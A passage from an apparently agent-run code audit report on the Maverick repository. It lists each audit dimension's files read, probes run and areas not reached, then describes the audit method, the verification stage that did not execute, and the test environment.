sink grep only), security.html/privacy.html builders (contexts around each innerHTML). NOT REACHED: Tauri/mobile/editor apps under apps/ (out of scope), runtime browser testing (no browser available), unminified-bundle analysis beyond byte counts.

**suite-consent** (W4-suites, 27 raised)  
Read fully (every line): consent_analytics, consent_application_scanner, consent_bulk_jobs, consent_custom_index, consent_delivery, consent_delivery_bridge, consent_delivery_destinations, consent_delivery_runtime, consent_ergonomics, consent_experiments, consent_global_opt_out, consent_identity_federation, consent_native_sdk, consent_preferences, consent_profile_data, consent_publishing, consent_registry, consent_scan_inventory, consent_scanner, consent_standards (20 of 22 files, ~37k lines). Header/docstring + grep-pattern pass only (connection handling, journal mode, history bounds, LIMITs, locks): consent_scan_notice_proposals (2248 lines) and consent_web_publish_settings (2111 lines) — no defects surfaced by the pattern pass; their bodies were not line-read because time was prioritised for the modules with network/crypto/enforcement surface. Cross-checks performed: reachability classification (python -m maverick.reachability --list, lock inspection), FEATURES.md claims (lines 2870-3060, 4338), prior audits grepped (only tools/consent_ergonomics token matching appears there — different file, already fixed per PUNCHLIST), dashboard call sites for store construction / dispatch / scheduler lease renewal, copy-paste divergence script (AST body hashing across all 22 files), and scratch executions that proved: unified_audit_records failure after unlink; expired-newer-receipt fallthrough; IAB GPP header strings rejected as non-canonical; BOM-less UTF-16 DTD bypass of _safe_xml; sqlite3 `with connection` not closing. Not reached: dashboard consent_*_api.py modules (out of scope), live Playwright scan, live provider transports.

**suite-ai** (W4-suites, 16 raised)  
Scope: all 44 ai_* modules under packages/maverick-core/maverick/ (69,959 lines). Inventory built for every file (size, persistence layer, network calls, test file presence, live reachability class via maverick.reachability.classify()). Grep-driven sweeps across all 44 files for: TODO/placeholder/NotImplemented, naive datetimes, swallowed exceptions, write patterns (atomic_write_text/os.replace), eval/exec/pickle/shell, network clients (urllib/httpx/safe_client), id generation, sorts on dict.get, sqlite PRAGMA/transaction usage, list-all-then-filter store scans, and an AST hash of every top-level helper body across the group (copy-paste divergence). Read fully: ai_act.py, ai_bom.py, ai_runtime_guardrails.py, ai_act_package.py (first 120 lines). Read in depth (all key paths): ai_evidence_gateway.py (deliver_text/_deliver_text_locked, reservation/completion, _sign_event, _signed_rows, listing, summary/_receipt_assurance_snapshot, verify_assurance_packet, enabled), ai_evidence_ledger.py (append, _verify_file, _iter_verified_rows, _update_index_after_append, find, _ensure_ready/_quick_physical_matches, _rebuild), ai_cost_collectors.py (Azure transport, AWS collector, next-link check), ai_cost_openai.py (transport, window math), ai_discovery_sensor_agents.py (signer, HTTPS transport, deliver_once, main, config), ai_vendor_portal.py (invitation issue/lookup/revoke), ai_inventory.py (transport, pagination, locks, failure paths), ai_inventory_connectors.py (request/retry helpers), ai_identity_governance_connectors.py (_safe_base_url), ai_policy_management.py (_decision/preview/matching), ai_dynamic_risk.py (score_asset, context floors, bounds), ai_entity_tasks.py (schema, create_task, purge), ai_evidence_analysis.py (sqlite schema), ai_governance_loop.py (connect, claim_next), ai_media_provenance_c2pa.py (pinned executable, process runner, TSA URL, erase), ai_benchmark_exchange.py (privacy/report normalization), ai_benchmark_exchange_transport.py (header), ai_business_intake.py (_classification), ai_incident_reporting.py (deadline math, clock), ai_literacy.py (status logic), ai_regulated_verticals.py (_wilson, content normalizers), ai_cost_roi.py (allocation math), ai_bank_mrm.py (section catalog). Sampled by outline plus targeted reads: ai_cloud_agent_governance.py (in-memory registries, HMAC authenticator), ai_identity_governance_controls/outcomes/provider_wire, ai_conformity_workflow, ai_explainability, ai_insurability, ai_media_provenance, ai_regulatory_feed, ai_discovery_sensors (ingest), ai_discovery_sensor_clients, ai_discovery_identity_adapters, ai_discovery_sensor_test_estate, ai_vendor_portal_pilot (main), ai_vendor_risk, ai_benchmark_coordinator. Executed: python -m maverick.reachability (live vs lock diff), a scratch ledger append benchmark (1,500 appends), a scratch pytest reproducing the stuck-conversation reservation (passes = bug confirmed), and a scratch script demonstrating guardrails behaviour without Shield. Not reached in depth: the bulk of ai_cloud_agent_governance (5,138 lines), ai_identity_governance_controls (3,145), ai_evidence_analysis (3,162) and ai_evidence_local_parsers business logic beyond the image/PDF bounds; dashboard-side route handlers (other auditors' scope) were only consulted to establish reachability/exposure of core functions. Regulatory citations spot-checked (AI Act Art. 73(2)/(3)/(4) windows, Art. 50 applicability date) were correct; no fabricated-citation finding.

**suite-privacy-datause** (W4-suites, 15 raised)  
Scope = 23 core modules (~48k lines). Read in full: privacy_egress.py, privacy_regulatory_intelligence_delivery.py. Deep-read (targeted sections, ~300-600 lines each): privacy_ops.py (_RecordStore, audit outbox/retry, DPA checklist + review_dpa, DSAR open/list/fulfil/export), privacy_data_discovery.py (PersonalDataDetector), privacy_rights_orchestration.py (helpers, closure four-eyes, purge_expired, _audit, schema FKs), privacy_rights_consumer_delivery.py (redeem, _failed_attempt), privacy_rights_source_adapters.py (URL/SOQL construction, headers, retention probe), privacy_rights_source_worker.py (dispatch loop), data_use_provider_adapters.py (identifier validation/quoting, _plan_statements), data_use_governance.py (_connect/_transaction, method inventory, stale-authority reasons), privacy_regulatory_intelligence.py (search/research/purge/schema), privacy_notice_governance.py (purge/retention), privacy_drop_management.py (statuses, purge), privacy_data_discovery_adapters.py (_AdapterBase + S3 adapter), privacy_rights_intake.py (quota transaction, key resolver). Grep-sampled only: privacy_discovery_data_use_bridge.py, privacy_discovery_data_map_target.py, privacy_notice_publication_bridge.py, privacy_data_discovery_remediation.py, data_use_provider_audit.py, data_use_provider_audit_authority.py, privacy_rights_ott_ctv.py, data_use_policy_compiler.py (helper bodies, exception handlers, connect/transaction patterns, FK/purge SQL). Executed: all 23 scope test files under pytest-cov (472 passed in 94s; per-module line coverage 67%-96%), maverick.reachability classify()+--ci, an AST script hashing same-name function bodies across the 23 files, and scratch probes of review_dpa() and PersonalDataDetector.detect_text() proving the false-positive findings. Prior audit docs grepped for every scope module name (no prior findings on these modules except an unrelated ADVERSARY_COUNCIL note on is_local_provider). Not reached: the dashboard-side *_api/_composition/_scheduler companions (out of scope), and a line-by-line read of the ~20k lines of audit/authority/remediation/bridge store internals (only sampled), so store-internal CAS/lease bugs in those four modules may remain undetected.

**suite-grc-security** (W4-suites, 21 raised)  
Read fully (every line): attestation.py, attestation_verify.py, control_plane_lease.py, security_defaults.py, compliance.py, dsar.py, dsar_fulfillment.py, erasure_verify.py, erasure_receipts.py, breach_notification.py, governance.py, soc2.py, governance_alerts.py, compliance_profiles.py, compliance_catalog.py, assessment_memory.py, assessment_exports.py, audit_contract.py, policy_exports.py, regulatory_compiler.py, grc_sync.py, control_data_plane_e2e.py, control_data_plane_soak.py (~9.5k lines). Read in targeted sections (headers, stores/persistence, id/digest helpers, network paths, date math, listing/ordering code, long functions): assessment.py (storage/list/load/save sections ~3150-3400, 4000-4270, 4989-5300 plus a citation sample), assessments.py (660-900, 1355-1399), compliance_scoping.py (1-120, 560-720), compliance_scope_actions.py (100-260, 470-720), policy_publication_links.py (1-80, 300-460 + capability-compare grep), governance_agents.py (350-460, 960-1060, 1240-1340, 2560-2600, 3028-3060), security_ops.py (1-60, 100-260, 2400-2470, 2780-2830, 3070-3120), model_risk_assurance.py (495-530, 2840-2960), policy_packs.py (1-60, 1040-1200), red_team_assurance.py (1-80, 540-660), red_team_campaigns.py (1-60, 420-520), grc_outbound_sync.py (1-120, 800-900), grc_vendor_transports.py (credential grep), incident_attachment_metadata.py (688-800), evidence_graph.py (1-60, 582-660, 838-905), governance_agent_context.py (544-620, 676-760), assessment_evidence_autopopulation.py (1-100, 1170-1260), soc2_certification_evidence.py (640-780), security_framework_catalog.py (1-140 + programmatic row-count verification of all five catalogs against their provenance 'selection' claims — all match). Grep-driven sweeps across all 42 files: naive datetimes/utcnow, except-pass, TODO/placeholder/stub, shell/eval, random/uuid id generation, file writes/atomicity/locks, network calls, sqlite, data_dir/path handling, float money, month arithmetic, silent truncation slices, C901 waivers, functions >=150 lines, AST hash of private helper bodies across the group (copy-paste divergence), audit_contract baseline (no scope modules in it), reachability classification (`python -m maverick.reachability --list UNREACHED|TEST_ONLY|CLI_ONLY`). Cross-checked dashboard callers: api.py list_saved call sites, app.py public /dsar/response route and bind_active_tenant middleware, governance_agents_api list_runs, automation_queue assess sweep, cli erase/erase-verify. Ran one scratch reproduction (MAVERICK_HOME in scratch dir) proving the assessment/assessments directory collision. Not reached: the bulk of the large state-machine bodies in governance_agents.py (~2k lines), model_risk_assurance.py (~2.7k), policy_packs.py service class (~1.1k), policy_publication_links.py (~2.5k), red_team_assurance.py (~2k), compliance_scoping/compliance_scope_actions business logic (~2.8k), incident_attachment_metadata CRUD (~800), grc_outbound_sync adapters (~700), the questionnaire template data in assessment.py (~3k lines of catalog text) and the catalog tuples in security_framework_catalog.py (~7k lines) — sampled only, so bugs inside those state machines/templates may remain. Regulatory citations I could not verify against post-cutoff sources (Colorado 'SB 26-189', 'SR 26-2', FedRAMP 2026 Class C) were deliberately not reported.

**suite-thirdparty-trust** (W4-suites, 23 raised)  
Inventory: all 23 files sized; test files exist for 21 (none dedicated for trc_evidence_collectors.py and trust_receipt_verify.py, both covered indirectly); every module has production importers (dashboard *_api/*_composition, wizard, cli/_trust_groups); reachability ledger lists only vendor_management explicitly, `python -m maverick.reachability` reports 6 UNREACHED repo-wide, none in scope. No prior-audit doc mentions these modules except QA_FINDINGS (trust_receipt tests). Read fully: vendor_management, vendor_onboarding, vendor_onboarding_adapters, vendor_onboarding_config, vendor_evidence_evolution, third_party_intelligence_delivery, trust_receipt_rekor, trust_receipt (build/sign/export/verify), consumer_trust_center (validation, read model, store), trc_continuous_evidence claim/complete/purge/run_claimed_collection, trust_receipt_verify verify/commitment/corroborate, trust_receipt_v1_verify ed25519+verify_envelope, third_party_intelligence_providers (credential authority, transport, adapter collect/parse), trc_stock_evidence_collectors (credential, AWS SigV4, transport, _provider_call, _parse_provider AWS/Azure, fetch, directory), third_party_intelligence_runtime (store connect/claim/fail, _execute_job, run_feed_batch, enqueue), third_party_executive_reports (dataclasses, renderer, init/migration, grants, purge), trust_center_branding (raster parsers, seal/unseal, projection/public asset), third_party_contracts (constants, authority, fields/formulas, backup), consumer_trust_center_authority (schema, principal, approve grant, export/verify, purge, integrity), third_party_lifecycle (validation, conditions, evaluation, transition, blockers, claim_callbacks, purge), third_party_collaboration (policy, tokens, contract_for_token, finalize, purge), third_party_intelligence (snapshot binding, findings, complete run, evaluate_risk, outbox, monitor observation, purge, integrity). Scratch proofs run: helper-body hashing across modules (top-level and store methods), error-code classification, PDF y-coordinate overflow. Not reached: lifecycle record_response_batch/begin_offboarding/exports, collaboration save_draft/rotate/revoke/follow-up, contracts create/update/history paths, intelligence EDD/exchange/source enrollment paths, executive_reports create_report and v1 migration, authority propose/revise/revoke context paths, trc register/enroll/update_enrollment, dashboard API/composition layers beyond the routes cited, and the AWS/Azure/GCP live API shapes (no botocore in env; Security Hub protocol finding rests on AWS API knowledge).

**ci-supply-chain** (W5-platform, 26 raised)  
READ FULLY: all 21 workflow files under .github/workflows (ci.yml 1032 lines, release.yml 807, publish.yml 1017, native.yml 851, homebrew-bump.yml 636, agent-on-pr.yml 523, desktop.yml 494, docs.yml 270, compliance-posture.yml, build-msi.yml, go-model-proxy.yml, mcp-clients.yml, mcp-client-{rust,java,csharp}.yml, commit-hygiene.yml, conventional-commits.yml, ui-regressions.yml, pages-deploy.yml, github-action.yml), .github/actions/test-shard/action.yml, .github/rulesets/protect-main.json, .github/dependabot.yml, .github/CODEOWNERS, .github/actionlint.yaml, .pre-commit-config.yaml, scripts/pre-push-lint.sh, scripts/{release_version,github_release_state,verify_github_release_assets,normalize_python_artifacts,verify_constraint_closure,install_release_cohort,build_standalone_skus,check_attribution}.py, requirements/ci.txt, requirements/docs.txt, release-cohort.toml, osv-scanner.toml, deploy/verify-release.sh, deploy/docker/Dockerfile, all 8 package pyproject headers, deploy/github-action/action.yml (first 150 lines), deploy/desktop/install.sh fetch path. .secrets.baseline analysed programmatically (148 files / 358 entries, all is_secret=false audited, 0 missing files, generated 2026-09-01) rather than read line-by-line. SAMPLED: docs/CONTRIBUTING.md CI section, MAINTAINERS.md, ARCHITECTURE.md release section, docs/DISTRIBUTION.md signing section, docs/compliance change-management claims, CHANGELOG headings, test_release_packaging.py test names, test_check_attribution.py ruleset tests. LIVE VERIFICATION via GitHub API (repo-scoped): open PRs, workflow-run history for main/ci.yml/release.yml/publish.yml/docs.yml/native.yml/commit-hygiene.yml (incl. merge_group event filter), PR #2448/#2449 merge metadata and head check-runs, release list, remote tags; PyPI JSON API reachability and package existence. NOT REACHED: scripts/check_vendor_onboarding_helm.py, scripts/demo_vendor_onboarding.py, scripts/build_standalone_skus.py internals beyond a full read, scripts/acceptance/ and scripts/stress/, deploy/helm and deploy/aws/terraform beyond version/image fields, apps/installer-desktop/scripts/verify-source.mjs, GitHub job logs for the red main run 33987984804 (API returned 404 for every job log), the live ruleset object itself (the session token is repo-scoped and gh CLI is absent, so the ruleset finding is inferred from run/merge evidence rather than read directly).

**deploy-infra** (W5-platform, 30 raised)  
READ FULLY: deploy/aws/terraform/* (all 15 .tf files, oidc.auto.tfvars, NEXT_STEPS.md, .gitignore, lock file); deploy/helm/** (Chart, values, all 10 templates, README); deploy/docker/* ; deploy/multiarch/*; deploy/vps/* (install.sh, maverick.service, Caddyfile); deploy/demo/* (compose, Caddyfile, env example, run-demo.sh, fly.toml, render.yaml, README); deploy/firecracker/* ; deploy/observability/* (grafana json, prometheus rules, runbook); deploy/relay/*; deploy/cloudflare/*; deploy/postgres/README.md; deploy/reference-architectures/** (all 13 files); deploy/desktop/install.sh (full) and install.ps1 (first 120 lines); deploy/github-action/action.yml (full); deploy/verify-release.sh; docs/deployment.md; docs/regulated-deployment.md. SAMPLED: deploy/homebrew/maverick.rb, deploy/gitlab-ci/*.yml, deploy/auth0/*.js (grep-level); deploy/github-action/sanitize_output.py and secret_env_registry.py NOT read (covered by packages/maverick-core/tests/test_github_action_security.py). Cross-checked against code: every env var injected by the ECS task definition exists in the codebase; /livez,/healthz,/readyz in app.py; metric names/types in health_routes.py; ?token= removal in app.py; release.yml image tag promotion; wizard.py for VPS/systemd/workdir behavior. TOOLS RUN: downloaded helm 3.16.4 and terraform 1.10.5 into scratch — `helm lint` (clean), `helm template` (default, ingress.enabled=true, secret.create=false), `terraform fmt -check` (clean), `terraform init -backend=false && terraform validate` (valid); `docker compose config` on all 3 compose files (valid; no daemon so no builds); started a real dashboard with MAVERICK_HOME redirected and proved `?token=` returns 401 from loopback and non-loopback while the Bearer header returns 303. NOT DONE: terraform plan/apply (no AWS creds), tflint/checkov/hadolint/kubeconform (not installed, network-limited), no Kubernetes cluster, no image build. Prior audits grepped: CODE_QUALITY_AUDIT.md relay findings still present at HEAD and are re-reported with prior_ref; the firecracker sandbox findings are in maverick/sandbox (out of this scope) and not repeated.

**tests-quality** (W5-platform, 19 raised)  
READ FULLY: repo-root conftest.py, packages/maverick-core/tests/conftest.py, pyproject [tool.pytest.ini_options], .github/actions/test-shard/action.yml, ci.yml test/test-window/posture/windows/postgres jobs, .github/rulesets/protect-main.json, the baseline log (all 6 failure tracebacks + warnings summary), and the individual tests cited in findings (test_provider_base_url_plumbing, test_doctor_corrupt_config, test_api healthz, test_egress_guard subprocess test, test_ui_visibility_fresh_process_smoke, test_world_model_concurrency, test_parser_fuzz harness, test_sandbox_local_timeout, test_scim/test_saml headers, test_wave6 pin test, sample no-assert tests). SWEPT BY SCRIPT over all 2,019 test files / 22,206 test functions (26,402 collected): static module→test mapping (1,373 non-test modules), AST smell sweep (assert-less, trivial asserts, sleeps, fixed /tmp, env mutation, sys.modules pops, duplicate names, unregistered marks, async-without-marker), skip-reason enumeration (-rs run over 88 skip-prone files), shard-balance simulation from the real collection order, importer analysis for zero-coverage modules. MEASURED: real line coverage with pytest-cov for maverick-core (core tests only, 20,080 passed, 13m37s: 82.1% of 255,860 statements; kernel: agent.py 85.2%, orchestrator.py 87.1%, world_model.py 91.9%, budget.py 92.5%, llm.py 94.6%, config.py 81.6%, cli/__init__.py 71.5% with 1,129 uncovered lines, world_model_backends/postgres.py 45% without the PG service) and maverick-dashboard (4,240 passed: 81.4% of 63,358 statements). CAVEAT: coverage of async FastAPI handlers is under-reported by the default CTracer here (e.g. scim.py create_user shows lines after the first `await` as missing even though test_scim asserts 201); dashboard percentages are floors, and I did not report SCIM as untested for that reason. Ran demo/ tests (144 pass / 24 fail, all env), `npm test` for sdks/plugin-ts (15/15 pass), and a 40-file forward-vs-reverse order experiment (503 pass both ways: no order dependence found in the sample). NOT REACHED: per-test durations for the dashboard/channels/mcp packages (only core's --durations=60), hypothesis-based fuzzing prototypes, Go/Rust/Tauri test suites (CI runs them; not reviewed for quality), mutation testing, and a full-suite run under a randomized order (pytest-randomly is not installed). helm/terraform absent; docker binary present but no daemon.

**dx-tooling** (W5-platform, 24 raised)  
Read fully: pyproject.toml (root), .pre-commit-config.yaml, .devcontainer/devcontainer.json, .devcontainer/post-create.sh, CONTRIBUTING.md (root; docs/CONTRIBUTING.md verified byte-identical via diff), AGENTS.md, .gitignore, .gitattributes, .dockerignore, scripts/pre-push-lint.sh, conftest.py (root), all 8 package pyproject.toml files, sdks/plugin-ts/package.json + tsconfig.json, .github/dependabot.yml, .github/actions/test-shard/action.yml, the CI `lint` and `test` jobs in .github/workflows/ci.yml (lines 26-270, 540-600), requirements/ci.txt (head + tool pins), the tail of the baseline test log and the six failing tests' fixtures. Ran: `ruff check --select ALL --statistics` over the whole repo (242 rule rows saved to scratch), per-family non-test counts for ~40 high-signal rules with manual reads of every ASYNC/DTZ/PLW1508/PLW1509/RUF013/LOG004/PLR0124/S307/S602 hit, `--extend-select RUF100` against the real config (734 stale noqa), pyright 1.1.408 on maverick-shield/-knowledge/-mcp (JSON saved; every non-missing-import error listed and ~30 read in source), `npm install && npm test` on a scratch copy of sdks/plugin-ts (15/15 pass on node 22, tsc 7.0.2), git object-size and tracked-binary sweeps, `git check-ignore` probes, ruff/vulture timings. Sampled only: rule hits for BLE001/S110/S608/PLW0603/T201 (distribution by package + 6-8 random lines each), CI jobs other than lint/test, other-language workflows (grep for vet/clippy/gofmt only). Not reached: mypy (pyright used instead), per-test duration profiling (baseline log has no --durations and a re-run was too expensive on the shared box), Tauri/desktop and Go/Rust developer tooling beyond confirming CI runs go vet/gofmt/cargo test, helm/terraform (absent on box; out of dimension). Prior-audit docs were grepped for pre-commit/devcontainer/mypy/pyright/CONTRIBUTING/editorconfig/Makefile/pitch/logo/package-lock; only PUNCHLIST_RESOLUTION.md:132 (pyright/mypy incrementally) and CODE_QUALITY_AUDIT.md:101 (pitch content contradiction) overlap.

**docs-accuracy** (W5-platform, 29 raised)  
Read in full: README.md, ARCHITECTURE.md, AGENTS.md, CLAUDE.md, CHANGELOG.md (head + version headings), mkdocs.yml, mkdocs.public.yml, docs/public-docs.txt, docs/index.md, docs/getting-started.md, docs/deployment.md, docs/api.md, docs/safety.md, docs/operations.md, docs/encryption.md (first 120 lines), docs/multi-tenancy.md, docs/knowledge.md, docs/plugins.md, docs/grpc.md, docs/press-kit.md, docs/comparison.md, docs/architecture.md (first 150 lines), docs/handbook.md (first 120 lines), docs/ROADMAP.md (first 100 lines), pitch/*.md numeric-claim lines, .github/workflows/docs.yml staging logic, publish.yml gating. Sampled: docs/FEATURES.md (section headings, Distribution & install, LLM providers, sandboxes, line-cited claims), docs/configuration.md (section list), docs/env-vars.md (header), docs/external-agents.md (revocation section), docs/security/threat-model.md, docs/showcase.md, docs/self-learning.md, docs/specs/skill-index.md, docs/user-stories.md (header), docs/clients/*.md (path refs). Scripted sweeps over ALL 301 docs/*.md + pitch/*.md + root docs: (1) every `maverick|lightwork <cmd>` and `<group> <sub>` invocation checked against the live CLI (159 top-level commands, 70 groups enumerated via --help); (2) every backticked repo path checked for existence; (3) every MAVERICK_* env var in docs checked against code, and code→docs coverage computed; (4) every `/api/v1/...` path in docs checked against the live OpenAPI spec (1,717 paths); (5) relative markdown links checked; (6) mkdocs strict builds actually run for BOTH mkdocs.yml and mkdocs.public.yml in a scratch staging (mkdocs-material installed in scratch) — both pass; (7) 40 documented CLI options verified via --help; (8) docs/configuration.md sections vs migrate.KNOWN_SECTIONS. Numeric claims verified against code: 2,031 packs (domains-lint), 54 suites (SUITE_PREFIXES; 2,031 packs map to 54), 514 skills (skills_builtin), 2,877 enterprise connectors + 37 public-data connectors (enterprise_connectors.py constants), 17 channel adapters, 9 sandbox modules, 14 provider adapter files, 293 tool modules, 40 builtin shield rules, SQLite schema head v33 / Postgres v23, 26,145 tests passing at HEAD. Not reached: full read of docs/FEATURES.md (5,049 lines), docs/connectors.md (3,031), docs/AI_GOVERNANCE_GAP_BUILDOUT_HANDOFF (1,913), docs/security-hardening.md, docs/user-stories.md, docs/research/**, docs/compliance/**, docs/rfcs/**, docs/i18n/** beyond the scripted sweeps; pitch PDFs/HTML not opened. helm/terraform binaries absent so deploy docs were checked against file trees only.

## Method notes and limits

- **Design.** Fifty-one audit dimensions, each with a written brief (scope file list + hunting method), run as
  finder agents in five parallel workflows (kernel/runtime, security, dashboard/product, governance suites,
  platform engineering). A shared brief fixed the evidence standard (file:line + verbatim quote + reachability +
  recommendation + effort + verification hint), the severity scale, the category taxonomy, a read-only rule for
  the repository, and the known-by-design list from `CLAUDE.md`. Finders were told to grep the prior audit
  documents before reporting so re-discoveries are flagged as such.
- **Verification.** Stage two (one independent skeptic per batch of six findings, then two adversarial refuters
  per surviving high/critical, majority-kill) was authored and started but did not execute: the usage cap was hit
  during the finder stage on the first attempt and the close-out was requested during the second. Eleven items
  were re-read by hand at close-out and are marked accordingly. Everything else is finder-only.
- **What completed (26):** kernel-agent-loop, llm-providers, world-model-data, concurrency-reliability,
  sandbox-isolation, tools-a-f, dashboard-auth, injection-sweep, crypto-secrets, shield-safety, tenant-isolation,
  network-egress, dashboard-core-api, dashboard-suite-apis, frontend, cli-ux, suite-ai, suite-consent,
  suite-privacy-datause, suite-thirdparty-trust, suite-grc-security, tests-quality, ci-supply-chain, deploy-infra,
  docs-accuracy, dx-tooling.
- **What did not (25):** tools-g-p, tools-q-z, learning-loop, plugins-marketplace-skills, performance-kernel,
  channels, mcp-server-client, privacy-compliance-flows, config-wizard-docs-parity, onboarding-first-run,
  api-contracts, observability-ops, i18n-a11y-polish, core-rest-1..4 (≈430 remaining core modules),
  domain-packs-governance-agents, dependency-health, ts-go-rust, apps-extensions,
  licensing-legal-repo-governance, benchmarks-evals, prior-findings-regression-a/b.
- **De-duplication.** Findings sharing a file, 25-line window and category, or a normalised title, were merged
  (561 → 538); the surviving item keeps the higher severity.
- **Environment.** Fresh container, all packages editable-installed via `.devcontainer/post-create.sh` (after
  shadowing Debian's `cryptography` 41 with `--ignore-installed`), no provider key, outbound network via proxy.
  The container exports `ANTHROPIC_BASE_URL`, which is what fails six baseline tests.
- **Reproduction.** Each finding's `How to confirm` line names the command, test or probe. Finder scratch scripts
  (route census, backend signature diff, bypass corpus, TestClient probes, FakeLLM repros) lived under the session
  scratch directory and are described in Appendix D; the most useful ones are worth committing as tests.
